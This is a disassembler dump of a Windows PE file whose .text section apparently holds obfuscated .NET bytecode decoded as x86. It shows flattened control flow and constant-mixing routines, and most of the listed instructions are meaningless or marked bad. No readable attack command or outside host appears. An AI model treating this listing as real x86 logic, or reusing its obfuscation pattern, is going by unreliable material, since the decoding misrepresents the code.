  405e19:	e5 f6                	in     $0xf6,%eax
  405e1b:	48                   	dec    %eax
  405e1c:	f5                   	cmc
  405e1d:	21 1f                	and    %ebx,(%edi)
  405e1f:	09 36                	or     %esi,(%esi)
  405e21:	c5 89 fb 43 f3 8d    	lds    -0x720cbc05(%ecx),%ecx
  405e27:	87 3b                	xchg   %edi,(%ebx)
  405e29:	6c                   	insb   (%dx),%es:(%edi)
  405e2a:	5d                   	pop    %ebp
  405e2b:	1e                   	push   %ds
  405e2c:	45                   	inc    %ebp
  405e2d:	71 bc                	jno    0x405deb
  405e2f:	ea ae f4 e1 f8 7c 15 	ljmp   $0x157c,$0xf8e1f4ae
  405e36:	0a 2b                	or     (%ebx),%ch
  405e38:	df                   	.byte 0xdf
  405e39:	3d                   	.byte 0x3d
  405e3a:	d1                   	.byte 0xd1
  405e3b:	79                   	.byte 0x79

Disassembly of section .text:

00406000 <.text>:
  406000:	48                   	dec    %eax
  406001:	00 00                	add    %al,(%eax)
  406003:	00 02                	add    %al,(%edx)
  406005:	00 05 00 3c 67 00    	add    %al,0x673c00
  40600b:	00 68 53             	add    %ch,0x53(%eax)
  40600e:	00 00                	add    %al,(%eax)
  406010:	03 00                	add    (%eax),%eax
  406012:	02 00                	add    (%eax),%al
  406014:	3b 00                	cmp    (%eax),%eax
  406016:	00 06                	add    %al,(%esi)
	...
  406048:	1e                   	push   %ds
  406049:	02 28                	add    (%eax),%ch
  40604b:	3e 00 00             	add    %al,%ds:(%eax)
  40604e:	0a 2a                	or     (%edx),%ch
  406050:	13 30                	adc    (%eax),%esi
  406052:	02 00                	add    (%eax),%al
  406054:	0b 00                	or     (%eax),%eax
  406056:	00 00                	add    %al,(%eax)
  406058:	01 00                	add    %eax,(%eax)
  40605a:	00 11                	add    %dl,(%ecx)
  40605c:	28 0a                	sub    %cl,(%edx)
  40605e:	00 00                	add    %al,(%eax)
  406060:	06                   	push   %es
  406061:	28 03                	sub    %al,(%ebx)
  406063:	00 00                	add    %al,(%eax)
  406065:	06                   	push   %es
  406066:	2a 00                	sub    (%eax),%al
  406068:	13 30                	adc    (%eax),%esi
  40606a:	08 00                	or     %al,(%eax)
  40606c:	76 06                	jbe    0x406074
  40606e:	00 00                	add    %al,(%eax)
  406070:	05 00 00 11 d0       	add    $0xd0110000,%eax
  406075:	01 00                	add    %eax,(%eax)
  406077:	00 02                	add    %al,(%edx)
  406079:	28 1e                	sub    %bl,(%esi)
  40607b:	00 00                	add    %al,(%eax)
  40607d:	0a 6f 22             	or     0x22(%edi),%ch
  406080:	00 00                	add    %al,(%eax)
  406082:	0a 25 6f 23 00 00    	or     0x236f,%ah
  406088:	0a 0a                	or     (%edx),%cl
  40608a:	06                   	push   %es
  40608b:	6f                   	outsl  %ds:(%esi),(%dx)
  40608c:	24 00                	and    $0x0,%al
  40608e:	00 0a                	add    %cl,(%edx)
  406090:	16                   	push   %ss
  406091:	31 0d 06 16 6f 25    	xor    %ecx,0x256f1606
  406097:	00 00                	add    %al,(%eax)
  406099:	0a 1f                	or     (%edi),%bl
  40609b:	3c fe                	cmp    $0xfe,%al
  40609d:	01 2b                	add    %ebp,(%ebx)
  40609f:	01 16                	add    %edx,(%esi)
  4060a1:	0b 28                	or     (%eax),%ebp
  4060a3:	26 00 00             	add    %al,%es:(%eax)
  4060a6:	0a 28                	or     (%eax),%ch
  4060a8:	27                   	daa
  4060a9:	00 00                	add    %al,(%eax)
  4060ab:	0a 0c 20             	or     (%eax,%eiz,1),%cl
  4060ae:	8d 58 d8             	lea    -0x28(%eax),%ebx
  4060b1:	ac                   	lods   %ds:(%esi),%al
  4060b2:	20 ec                	and    %ch,%ah
  4060b4:	80 3d 83 61 25 13 17 	cmpb   $0x17,0x13256183
  4060bb:	1f                   	pop    %ds
  4060bc:	2b 5e 45             	sub    0x45(%esi),%ebx
  4060bf:	2b 00                	sub    (%eax),%eax
  4060c1:	00 00                	add    %al,(%eax)
  4060c3:	7b 03                	jnp    0x4060c8
  4060c5:	00 00                	add    %al,(%eax)
  4060c7:	69 00 00 00 35 00    	imul   $0x350000,(%eax),%eax
  4060cd:	00 00                	add    %al,(%eax)
  4060cf:	e8 03 00 00 ed       	call   0xed4060d7
  4060d4:	02 00                	add    (%eax),%al
  4060d6:	00 31                	add    %dh,(%ecx)
  4060d8:	02 00                	add    (%eax),%al
  4060da:	00 9a 01 00 00 42    	add    %bl,0x42000001(%edx)
  4060e0:	03 00                	add    (%eax),%eax
  4060e2:	00 5e 02             	add    %bl,0x2(%esi)
  4060e5:	00 00                	add    %al,(%eax)
  4060e7:	05 00 00 00 d2       	add    $0xd2000000,%eax
  4060ec:	02 00                	add    (%eax),%al
  4060ee:	00 6a 01             	add    %ch,0x1(%edx)
  4060f1:	00 00                	add    %al,(%eax)
  4060f3:	16                   	push   %ss
  4060f4:	05 00 00 37 01       	add    $0x1370000,%eax
  4060f9:	00 00                	add    %al,(%eax)
  4060fb:	80 01 00             	addb   $0x0,(%ecx)
  4060fe:	00 fe                	add    %bh,%dh
  406100:	00 00                	add    %al,(%eax)
  406102:	00 fb                	add    %bh,%bl
  406104:	03 00                	add    (%eax),%eax
  406106:	00 d2                	add    %dl,%dl
  406108:	00 00                	add    %al,(%eax)
  40610a:	00 4a 02             	add    %cl,0x2(%edx)
  40610d:	00 00                	add    %al,(%eax)
  40610f:	e5 01                	in     $0x1,%eax
  406111:	00 00                	add    %al,(%eax)
  406113:	58                   	pop    %eax
  406114:	03 00                	add    (%eax),%eax
  406116:	00 53 04             	add    %dl,0x4(%ebx)
  406119:	00 00                	add    %al,(%eax)
  40611b:	7a 05                	jp     0x406122
  40611d:	00 00                	add    %al,(%eax)
  40611f:	42                   	inc    %edx
  406120:	05 00 00 5b 05       	add    $0x55b0000,%eax
  406125:	00 00                	add    %al,(%eax)
  406127:	b4 01                	mov    $0x1,%ah
  406129:	00 00                	add    %al,(%eax)
  40612b:	57                   	push   %edi
  40612c:	01 00                	add    %eax,(%eax)
  40612e:	00 21                	add    %ah,(%ecx)
  406130:	01 00                	add    %eax,(%eax)
  406132:	00 d4                	add    %dl,%ah
  406134:	01 00                	add    %eax,(%eax)
  406136:	00 20                	add    %ah,(%eax)
  406138:	04 00                	add    $0x0,%al
  40613a:	00 eb                	add    %ch,%bl
  40613c:	00 00                	add    %al,(%eax)
  40613e:	00 ef                	add    %ch,%bh
  406140:	04 00                	add    $0x0,%al
  406142:	00 9b 00 00 00 9a    	add    %bl,-0x66000000(%ebx)
  406148:	04 00                	add    $0x0,%al
  40614a:	00 3e                	add    %bh,(%esi)
  40614c:	ff                   	(bad)
  40614d:	ff                   	(bad)
  40614e:	ff 13                	call   *(%ebx)
  406150:	04 00                	add    $0x0,%al
  406152:	00 d0                	add    %dl,%al
  406154:	04 00                	add    $0x0,%al
  406156:	00 a0 02 00 00 4f    	add    %ah,0x4f000002(%eax)
  40615c:	00 00                	add    %al,(%eax)
  40615e:	00 86 02 00 00 12    	add    %al,0x12000002(%esi)
  406164:	03 00                	add    (%eax),%eax
  406166:	00 c8                	add    %cl,%al
  406168:	03 00                	add    (%eax),%eax
  40616a:	00 88 00 00 00 38    	add    %cl,0x38000000(%eax)
  406170:	75 05                	jne    0x406177
  406172:	00 00                	add    %al,(%eax)
  406174:	11 07                	adc    %eax,(%edi)
  406176:	25 1a 58 13 07       	and    $0x713581a,%eax
  40617b:	4b                   	dec    %ebx
  40617c:	11 07                	adc    %eax,(%edi)
  40617e:	25 1a 58 13 07       	and    $0x713581a,%eax
  406183:	4b                   	dec    %ebx
  406184:	5a                   	pop    %edx
  406185:	13 11                	adc    (%ecx),%edx
  406187:	11 11                	adc    %edx,(%ecx)
  406189:	20 24 79             	and    %ah,(%ecx,%edi,2)
  40618c:	65 af                	gs scas %es:(%edi),%eax
  40618e:	2e 08 20             	or     %ah,%cs:(%eax)
  406191:	4e                   	dec    %esi
  406192:	ed                   	in     (%dx),%eax
  406193:	c8 b2 25 2b          	enter  $0x25b2,$0x2b
  406197:	06                   	push   %es
  406198:	20 da                	and    %bl,%dl
  40619a:	a8 b6                	test   $0xb6,%al
  40619c:	ba 25 26 38 0e       	mov    $0xe382625,%edx
  4061a1:	ff                   	(bad)
  4061a2:	ff                   	(bad)
  4061a3:	ff 11                	call   *(%ecx)
  4061a5:	16                   	push   %ss
  4061a6:	11 06                	adc    %eax,(%esi)
  4061a8:	37                   	aaa
  4061a9:	08 20                	or     %ah,(%eax)
  4061ab:	60                   	pusha
  4061ac:	e0 82                	loopne 0x406130
  4061ae:	b5 25                	mov    $0x25,%ch
  4061b0:	2b 06                	sub    (%esi),%eax
  4061b2:	20 14 b2             	and    %dl,(%edx,%esi,4)
  4061b5:	97                   	xchg   %eax,%edi
  4061b6:	fa                   	cli
  4061b7:	25 26 38 f4 fe       	and    $0xfef43826,%eax
  4061bc:	ff                   	(bad)
  4061bd:	ff 11                	call   *(%ecx)
  4061bf:	15 1f 10 2f 08       	adc    $0x82f101f,%eax
  4061c4:	20 7e c4             	and    %bh,-0x3c(%esi)
  4061c7:	52                   	push   %edx
  4061c8:	c3                   	ret
  4061c9:	25 2b 06 20 4b       	and    $0x4b20062b,%eax
  4061ce:	5c                   	pop    %esp
  4061cf:	4b                   	dec    %ebx
  4061d0:	fb                   	sti
  4061d1:	25 26 38 da fe       	and    $0xfeda3826,%eax
  4061d6:	ff                   	(bad)
  4061d7:	ff 11                	call   *(%ecx)
  4061d9:	0f 17 58 13          	movhps %xmm3,0x13(%eax)
  4061dd:	0f 11 16             	movups %xmm2,(%esi)
  4061e0:	17                   	pop    %ss
  4061e1:	58                   	pop    %eax
  4061e2:	13 16                	adc    (%esi),%edx
  4061e4:	11 17                	adc    %edx,(%edi)
  4061e6:	20 f6                	and    %dh,%dh
  4061e8:	c2 9e 07             	ret    $0x79e
  4061eb:	5a                   	pop    %edx
  4061ec:	20 bc 74 76 e8 61 38 	and    %bh,0x3861e876(%esp,%esi,2)
  4061f3:	bb fe ff ff 11       	mov    $0x11fffffe,%ebx
  4061f8:	17                   	pop    %ss
  4061f9:	20 70 b5             	and    %dh,-0x4b(%eax)
  4061fc:	ba 71 5a 20 90       	mov    $0x90205a71,%edx
  406201:	e3 32                	jecxz  0x406235
  406203:	3b 61 38             	cmp    0x38(%ecx),%esp
  406206:	a8 fe                	test   $0xfe,%al
  406208:	ff                   	(bad)
  406209:	ff 11                	call   *(%ecx)
  40620b:	05 25 4b 11 0c       	add    $0xc114b25,%eax
  406210:	11 0f                	adc    %ecx,(%edi)
  406212:	1f                   	pop    %ds
  406213:	0f 5f 95 61 54 11 0c 	maxps  0xc115461(%ebp),%xmm2
  40621a:	11 0f                	adc    %ecx,(%edi)
  40621c:	1f                   	pop    %ds
  40621d:	0f 5f 11             	maxps  (%ecx),%xmm2
  406220:	0c 11                	or     $0x11,%al
  406222:	0f 1f 0f             	nopl   (%edi)
  406225:	5f                   	pop    %edi
  406226:	95                   	xchg   %eax,%ebp
  406227:	11 05 25 1a 58 13    	adc    %eax,0x13581a25
  40622d:	05 4b 61 20 19       	add    $0x1920614b,%eax
  406232:	28 bb 3d 58 9e 20    	sub    %bh,0x209e583d(%ebx)
  406238:	1d d9 66 e8 38       	sbb    $0x38e866d9,%eax
  40623d:	71 fe                	jno    0x40623d
  40623f:	ff                   	(bad)
  406240:	ff 11                	call   *(%ecx)
  406242:	10 09                	adc    %cl,(%ecx)
  406244:	2f                   	das
  406245:	08 20                	or     %ah,(%eax)
  406247:	97                   	xchg   %eax,%edi
  406248:	f0 7e dc             	lock jle 0x406227
  40624b:	25 2b 06 20 c3       	and    $0xc320062b,%eax
  406250:	37                   	aaa
  406251:	84 a7 25 26 38 58    	test   %ah,0x58382625(%edi)
  406257:	fe                   	(bad)
  406258:	ff                   	(bad)
  406259:	ff 11                	call   *(%ecx)
  40625b:	17                   	pop    %ss
  40625c:	20 d0                	and    %dl,%al
  40625e:	d0 38                	sarb   $1,(%eax)
  406260:	28 5a 20             	sub    %bl,0x20(%edx)
  406263:	c8 2f f8 75          	enter  $0xf82f,$0x75
  406267:	61                   	popa
  406268:	38 45 fe             	cmp    %al,-0x2(%ebp)
  40626b:	ff                   	(bad)
  40626c:	ff 11                	call   *(%ecx)
  40626e:	0c 1f                	or     $0x1f,%al
  406270:	0c 11                	or     $0x11,%al
  406272:	0c 1f                	or     $0x1f,%al
  406274:	0c 95                	or     $0x95,%al
  406276:	11 0d 1f 0c 95 61    	adc    %ecx,0x61950c1f
  40627c:	9e                   	sahf
  40627d:	11 17                	adc    %edx,(%edi)
  40627f:	20 c4                	and    %al,%ah
  406281:	a1 32 ce 5a 20       	mov    0x205ace32,%eax
  406286:	80 40 0f f9          	addb   $0xf9,0xf(%eax)
  40628a:	61                   	popa
  40628b:	38 22                	cmp    %ah,(%edx)
  40628d:	fe                   	(bad)
  40628e:	ff                   	(bad)
  40628f:	ff 16                	call   *(%esi)
  406291:	13 15 11 17 20 0b    	adc    0xb201711,%edx
  406297:	13 08                	adc    (%eax),%ecx
  406299:	f7 5a 20             	negl   0x20(%edx)
  40629c:	f0 82 45 23 61       	lock addb $0x61,0x23(%ebp)
  4062a1:	38 0c fe             	cmp    %cl,(%esi,%edi,8)
  4062a4:	ff                   	(bad)
  4062a5:	ff 11                	call   *(%ecx)
  4062a7:	0c 16                	or     $0x16,%al
  4062a9:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  4062ac:	95                   	xchg   %eax,%ebp
  4062ad:	11 0d 16 95 61 9e    	adc    %ecx,0x9e619516
  4062b3:	11 17                	adc    %edx,(%edi)
  4062b5:	20 28                	and    %ch,(%eax)
  4062b7:	f7 4b 0d 5a 20 5c 54 	testl  $0x545c205a,0xd(%ebx)
  4062be:	d6                   	salc
  4062bf:	02 61 38             	add    0x38(%ecx),%ah
  4062c2:	ec                   	in     (%dx),%al
  4062c3:	fd                   	std
  4062c4:	ff                   	(bad)
  4062c5:	ff 11                	call   *(%ecx)
  4062c7:	17                   	pop    %ss
  4062c8:	20 71 55             	and    %dh,0x55(%ecx)
  4062cb:	b0 85                	mov    $0x85,%al
  4062cd:	5a                   	pop    %edx
  4062ce:	20 81 75 90 80 61    	and    %al,0x61809075(%ecx)
  4062d4:	38 d9                	cmp    %bl,%cl
  4062d6:	fd                   	std
  4062d7:	ff                   	(bad)
  4062d8:	ff 16                	call   *(%esi)
  4062da:	13 10                	adc    (%eax),%edx
  4062dc:	11 17                	adc    %edx,(%edi)
  4062de:	20 16                	and    %dl,(%esi)
  4062e0:	80 39 4b             	cmpb   $0x4b,(%ecx)
  4062e3:	5a                   	pop    %edx
  4062e4:	20 ad c8 d6 64 61    	and    %ch,0x6164d6c8(%ebp)
  4062ea:	38 c3                	cmp    %al,%bl
  4062ec:	fd                   	std
  4062ed:	ff                   	(bad)
  4062ee:	ff 11                	call   *(%ecx)
  4062f0:	14 11                	adc    $0x11,%al
  4062f2:	13 34 08             	adc    (%eax,%ecx,1),%esi
  4062f5:	20 8a 81 20 92 25    	and    %cl,0x25922081(%edx)
  4062fb:	2b 06                	sub    (%esi),%eax
  4062fd:	20 58 70             	and    %bl,0x70(%eax)
  406300:	1d ed 25 26 38       	sbb    $0x382625ed,%eax
  406305:	a9 fd ff ff 11       	test   $0x11fffffd,%eax
  40630a:	0d 11 15 11 09       	or     $0x9111511,%eax
  40630f:	9e                   	sahf
  406310:	11 17                	adc    %edx,(%edi)
  406312:	20 37                	and    %dh,(%edi)
  406314:	96                   	xchg   %eax,%esi
  406315:	36 af                	ss scas %es:(%edi),%eax
  406317:	5a                   	pop    %edx
  406318:	20 e2                	and    %ah,%dl
  40631a:	9f                   	lahf
  40631b:	fc                   	cld
  40631c:	b6 61                	mov    $0x61,%dh
  40631e:	38 8f fd ff ff 11    	cmp    %cl,0x11fffffd(%edi)
  406324:	0c 17                	or     $0x17,%al
  406326:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  406329:	95                   	xchg   %eax,%ebp
  40632a:	11 0d 17 95 5a 9e    	adc    %ecx,0x9e5a9517
  406330:	11 17                	adc    %edx,(%edi)
  406332:	20 8b dd 8b 97 5a    	and    %cl,0x5a978bdd(%ebx)
  406338:	20 5b 06             	and    %bl,0x6(%ebx)
  40633b:	96                   	xchg   %eax,%esi
  40633c:	3c 61                	cmp    $0x61,%al
  40633e:	38 6f fd             	cmp    %ch,-0x3(%edi)
  406341:	ff                   	(bad)
  406342:	ff 11                	call   *(%ecx)
  406344:	0c 11                	or     $0x11,%al
  406346:	15 11 0b 9e 20       	adc    $0x209e0b11,%eax
  40634b:	52                   	push   %edx
  40634c:	af                   	scas   %es:(%edi),%eax
  40634d:	82 89 38 5e fd ff ff 	orb    $0xff,-0x2a1c8(%ecx)
  406354:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  406357:	0f 11 0c 1f          	movups %xmm1,(%edi,%ebx,1)
  40635b:	0f 95 11             	setne  (%ecx)
  40635e:	0d 1f 0f 95 61       	or     $0x61950f1f,%eax
  406363:	9e                   	sahf
  406364:	1f                   	pop    %ds
  406365:	40                   	inc    %eax
  406366:	13 0e                	adc    (%esi),%ecx
  406368:	11 05 28 28 00 00    	adc    %eax,0x2828
  40636e:	0a 11                	or     (%ecx),%dl
  406370:	06                   	push   %es
  406371:	18 62 11             	sbb    %ah,0x11(%edx)
  406374:	0e                   	push   %cs
  406375:	12 0e                	adc    (%esi),%cl
  406377:	28 09                	sub    %cl,(%ecx)
  406379:	00 00                	add    %al,(%eax)
  40637b:	06                   	push   %es
  40637c:	26 11 0e             	adc    %ecx,%es:(%esi)
  40637f:	1f                   	pop    %ds
  406380:	40                   	inc    %eax
  406381:	2e 08 20             	or     %ah,%cs:(%eax)
  406384:	46                   	inc    %esi
  406385:	40                   	inc    %eax
  406386:	38 a8 25 2b 06 20    	cmp    %ch,0x20062b25(%eax)
  40638c:	df 94 66 d9 25 26 11 	fists  0x112625d9(%esi,%eiz,2)
  406393:	17                   	pop    %ss
  406394:	20 f5                	and    %dh,%ch
  406396:	57                   	push   %edi
  406397:	27                   	daa
  406398:	b9 5a 61 38 12       	mov    $0x1238615a,%ecx
  40639d:	fd                   	std
  40639e:	ff                   	(bad)
  40639f:	ff 11                	call   *(%ecx)
  4063a1:	15 17 58 13 15       	adc    $0x15135817,%eax
  4063a6:	11 17                	adc    %edx,(%edi)
  4063a8:	20 44 2d 96          	and    %al,-0x6a(%ebp,%ebp,1)
  4063ac:	84 5a 20             	test   %bl,0x20(%edx)
  4063af:	68 bd b2 14 61       	push   $0x6114b2bd
  4063b4:	38 f9                	cmp    %bh,%cl
  4063b6:	fc                   	cld
  4063b7:	ff                   	(bad)
  4063b8:	ff 2a                	ljmp   *(%edx)
  4063ba:	11 17                	adc    %edx,(%edi)
  4063bc:	20 7b af             	and    %bh,-0x51(%ebx)
  4063bf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4063c0:	b3 5a                	mov    $0x5a,%bl
  4063c2:	20 17                	and    %dl,(%edi)
  4063c4:	92                   	xchg   %eax,%edx
  4063c5:	d1 aa 61 38 e5 fc    	shrl   $1,-0x31ac79f(%edx)
  4063cb:	ff                   	(bad)
  4063cc:	ff 20                	jmp    *(%eax)
  4063ce:	45                   	inc    %ebp
  4063cf:	2b 2f                	sub    (%edi),%ebp
  4063d1:	5c                   	pop    %esp
  4063d2:	13 09                	adc    (%ecx),%ecx
  4063d4:	20 9e 22 f3 5a 13    	and    %bl,0x135af322(%esi)
  4063da:	0a 20                	or     (%eax),%ah
  4063dc:	4f                   	dec    %edi
  4063dd:	e8 2a 09 13 0b       	call   0xb536d0c
  4063e2:	11 17                	adc    %edx,(%edi)
  4063e4:	20 fb                	and    %bh,%bl
  4063e6:	68 5b f3 5a 20       	push   $0x205af35b
  4063eb:	ad                   	lods   %ds:(%esi),%eax
  4063ec:	1a ca                	sbb    %dl,%cl
  4063ee:	d6                   	salc
  4063ef:	61                   	popa
  4063f0:	38 bd fc ff ff 20    	cmp    %bh,0x20fffffc(%ebp)
  4063f6:	9a b9 5d 22 13 08 11 	lcall  $0x1108,$0x13225db9
  4063fd:	17                   	pop    %ss
  4063fe:	20 c9                	and    %cl,%cl
  406400:	95                   	xchg   %eax,%ebp
  406401:	c5 53 5a             	lds    0x5a(%ebx),%edx
  406404:	20 82 90 1e b7 61    	and    %al,0x61b71e90(%edx)
  40640a:	38 a3 fc ff ff 11    	cmp    %ah,0x11fffffc(%ebx)
  406410:	08 11                	or     %dl,(%ecx)
  406412:	12 25 1a 58 13 12    	adc    0x1213581a,%ah
  406418:	4b                   	dec    %ebx
  406419:	61                   	popa
  40641a:	11 09                	adc    %ecx,(%ecx)
  40641c:	58                   	pop    %eax
  40641d:	11 0a                	adc    %ecx,(%edx)
  40641f:	11 0b                	adc    %ecx,(%ebx)
  406421:	5a                   	pop    %edx
  406422:	58                   	pop    %eax
  406423:	11 09                	adc    %ecx,(%ecx)
  406425:	13 08                	adc    (%eax),%ecx
  406427:	11 0a                	adc    %ecx,(%edx)
  406429:	13 09                	adc    (%ecx),%ecx
  40642b:	11 0b                	adc    %ecx,(%ebx)
  40642d:	13 09                	adc    (%ecx),%ecx
  40642f:	13 0b                	adc    (%ebx),%ecx
  406431:	11 14 17             	adc    %edx,(%edi,%edx,1)
  406434:	58                   	pop    %eax
  406435:	13 14 20             	adc    (%eax,%eiz,1),%edx
  406438:	1e                   	push   %ds
  406439:	9d                   	popf
  40643a:	dd 8c 38 71 fc ff ff 	fisttpll -0x38f(%eax,%edi,1)
  406441:	11 07                	adc    %eax,(%edi)
  406443:	4b                   	dec    %ebx
  406444:	2b 08                	sub    (%eax),%ecx
  406446:	11 07                	adc    %eax,(%edi)
  406448:	18 d3                	sbb    %dl,%bl
  40644a:	1a 5a 58             	sbb    0x58(%edx),%bl
  40644d:	4b                   	dec    %ebx
  40644e:	18 64 13 06          	sbb    %ah,0x6(%ebx,%edx,1)
  406452:	20 71 69             	and    %dh,0x69(%ecx)
  406455:	bd f2 38 56 fc       	mov    $0xfc5638f2,%ebp
  40645a:	ff                   	(bad)
  40645b:	ff 1f                	lcall  *(%edi)
  40645d:	10 8d 1d 00 00 01    	adc    %cl,0x100001d(%ebp)
  406463:	13 0c 1f             	adc    (%edi,%ebx,1),%ecx
  406466:	10 8d 1d 00 00 01    	adc    %cl,0x100001d(%ebp)
  40646c:	13 0d 11 17 20 1c    	adc    0x1c201711,%ecx
  406472:	e7 e2                	out    %eax,$0xe2
  406474:	a9 5a 20 28 ac       	test   $0xac28205a,%eax
  406479:	50                   	push   %eax
  40647a:	d4 61                	aam    $0x61
  40647c:	38 31                	cmp    %dh,(%ecx)
  40647e:	fc                   	cld
  40647f:	ff                   	(bad)
  406480:	ff 08                	decl   (%eax)
  406482:	07                   	pop    %es
  406483:	2d 07 11 07 1a       	sub    $0x1a071107,%eax
  406488:	58                   	pop    %eax
  406489:	4b                   	dec    %ebx
  40648a:	2b 08                	sub    (%eax),%ecx
  40648c:	11 07                	adc    %eax,(%edi)
  40648e:	19 d3                	sbb    %edx,%ebx
  406490:	1a 5a 58             	sbb    0x58(%edx),%bl
  406493:	4b                   	dec    %ebx
  406494:	e0 58                	loopne 0x4064ee
  406496:	13 12                	adc    (%edx),%edx
  406498:	11 07                	adc    %eax,(%edi)
  40649a:	18 d3                	sbb    %dl,%bl
  40649c:	1a 5a 58             	sbb    0x58(%edx),%bl
  40649f:	4b                   	dec    %ebx
  4064a0:	18 64 13 13          	sbb    %ah,0x13(%ebx,%edx,1)
  4064a4:	16                   	push   %ss
  4064a5:	13 14 20             	adc    (%eax,%eiz,1),%edx
  4064a8:	1e                   	push   %ds
  4064a9:	9d                   	popf
  4064aa:	dd 8c 38 01 fc ff ff 	fisttpll -0x3ff(%eax,%edi,1)
  4064b1:	16                   	push   %ss
  4064b2:	13 16                	adc    (%esi),%edx
  4064b4:	11 17                	adc    %edx,(%edi)
  4064b6:	20 1c ac             	and    %bl,(%esp,%ebp,4)
  4064b9:	3e d7                	xlat   %ds:(%ebx)
  4064bb:	5a                   	pop    %edx
  4064bc:	20 d7                	and    %dl,%bh
  4064be:	5f                   	pop    %edi
  4064bf:	47                   	inc    %edi
  4064c0:	69 61 38 eb fb ff ff 	imul   $0xfffffbeb,0x38(%ecx),%esp
  4064c7:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  4064ca:	0b 11                	or     (%ecx),%edx
  4064cc:	0c 1f                	or     $0x1f,%al
  4064ce:	0b 95 11 0d 1f 0b    	or     0xb1f0d11(%ebp),%edx
  4064d4:	95                   	xchg   %eax,%ebp
  4064d5:	58                   	pop    %eax
  4064d6:	9e                   	sahf
  4064d7:	11 17                	adc    %edx,(%edi)
  4064d9:	20 02                	and    %al,(%edx)
  4064db:	fc                   	cld
  4064dc:	ba ae 5a 20 c5       	mov    $0xc5205aae,%edx
  4064e1:	b9 38 78 61 38       	mov    $0x38617838,%ecx
  4064e6:	c8 fb ff ff          	enter  $0xfffb,$0xff
  4064ea:	11 0c 1d 11 0c 1d 95 	adc    %ecx,-0x6ae2f3ef(,%ebx,1)
  4064f1:	11 0d 1d 95 5a 9e    	adc    %ecx,0x9e5a951d
  4064f7:	11 0c 1e             	adc    %ecx,(%esi,%ebx,1)
  4064fa:	11 0c 1e             	adc    %ecx,(%esi,%ebx,1)
  4064fd:	95                   	xchg   %eax,%ebp
  4064fe:	11 0d 1e 95 58 9e    	adc    %ecx,0x9e58951e
  406504:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  406507:	09 11                	or     %edx,(%ecx)
  406509:	0c 1f                	or     $0x1f,%al
  40650b:	09 95 11 0d 1f 09    	or     %edx,0x91f0d11(%ebp)
  406511:	95                   	xchg   %eax,%ebp
  406512:	61                   	popa
  406513:	9e                   	sahf
  406514:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  406517:	0a 11                	or     (%ecx),%dl
  406519:	0c 1f                	or     $0x1f,%al
  40651b:	0a 95 11 0d 1f 0a    	or     0xa1f0d11(%ebp),%dl
  406521:	95                   	xchg   %eax,%ebp
  406522:	5a                   	pop    %edx
  406523:	9e                   	sahf
  406524:	11 17                	adc    %edx,(%edi)
  406526:	20 2a                	and    %ch,(%edx)
  406528:	6f                   	outsl  %ds:(%esi),(%dx)
  406529:	52                   	push   %edx
  40652a:	57                   	push   %edi
  40652b:	5a                   	pop    %edx
  40652c:	20 12                	and    %dl,(%edx)
  40652e:	01 b1 db 61 38 7b    	add    %esi,0x7b3861db(%ecx)
  406534:	fb                   	sti
  406535:	ff                   	(bad)
  406536:	ff 11                	call   *(%ecx)
  406538:	0c 18                	or     $0x18,%al
  40653a:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
  40653d:	95                   	xchg   %eax,%ebp
  40653e:	11 0d 18 95 58 9e    	adc    %ecx,0x9e589518
  406544:	11 17                	adc    %edx,(%edi)
  406546:	20 5f 42             	and    %bl,0x42(%edi)
  406549:	12 47 5a             	adc    0x5a(%edi),%al
  40654c:	20 2c e8             	and    %ch,(%eax,%ebp,8)
  40654f:	90                   	nop
  406550:	5b                   	pop    %ebx
  406551:	61                   	popa
  406552:	38 5b fb             	cmp    %bl,-0x5(%ebx)
  406555:	ff                   	(bad)
  406556:	ff 11                	call   *(%ecx)
  406558:	17                   	pop    %ss
  406559:	20 65 aa             	and    %ah,-0x56(%ebp)
  40655c:	7b 19                	jnp    0x406577
  40655e:	5a                   	pop    %edx
  40655f:	20 69 8e             	and    %ch,-0x72(%ecx)
  406562:	51                   	push   %ecx
  406563:	ee                   	out    %al,(%dx)
  406564:	61                   	popa
  406565:	38 48 fb             	cmp    %cl,-0x5(%eax)
  406568:	ff                   	(bad)
  406569:	ff 11                	call   *(%ecx)
  40656b:	11 2c 08             	adc    %ebp,(%eax,%ecx,1)
  40656e:	20 53 ba             	and    %dl,-0x46(%ebx)
  406571:	13 95 25 2b 06 20    	adc    0x20062b25(%ebp),%edx
  406577:	58                   	pop    %eax
  406578:	70 1d                	jo     0x406597
  40657a:	ed                   	in     (%dx),%eax
  40657b:	25 26 38 30 fb       	and    $0xfb303826,%eax
  406580:	ff                   	(bad)
  406581:	ff 16                	call   *(%esi)
  406583:	13 0f                	adc    (%edi),%ecx
  406585:	20 e4                	and    %ah,%ah
  406587:	5a                   	pop    %edx
  406588:	9f                   	lahf
  406589:	a3 38 23 fb ff       	mov    %eax,0xfffb2338
  40658e:	ff 11                	call   *(%ecx)
  406590:	0c 1f                	or     $0x1f,%al
  406592:	0d 11 0c 1f 0d       	or     $0xd1f0c11,%eax
  406597:	95                   	xchg   %eax,%ebp
  406598:	11 0d 1f 0d 95 5a    	adc    %ecx,0x5a950d1f
  40659e:	9e                   	sahf
  40659f:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  4065a2:	0e                   	push   %cs
  4065a3:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  4065a6:	0e                   	push   %cs
  4065a7:	95                   	xchg   %eax,%ebp
  4065a8:	11 0d 1f 0e 95 58    	adc    %ecx,0x58950e1f
  4065ae:	9e                   	sahf
  4065af:	11 17                	adc    %edx,(%edi)
  4065b1:	20 47 2c             	and    %al,0x2c(%edi)
  4065b4:	04 6a                	add    $0x6a,%al
  4065b6:	5a                   	pop    %edx
  4065b7:	20 8c 16 e0 91 61 38 	and    %cl,0x386191e0(%esi,%edx,1)
  4065be:	f0 fa                	lock cli
  4065c0:	ff                   	(bad)
  4065c1:	ff 11                	call   *(%ecx)
  4065c3:	0c 19                	or     $0x19,%al
  4065c5:	11 0c 19             	adc    %ecx,(%ecx,%ebx,1)
  4065c8:	95                   	xchg   %eax,%ebp
  4065c9:	11 0d 19 95 61 9e    	adc    %ecx,0x9e619519
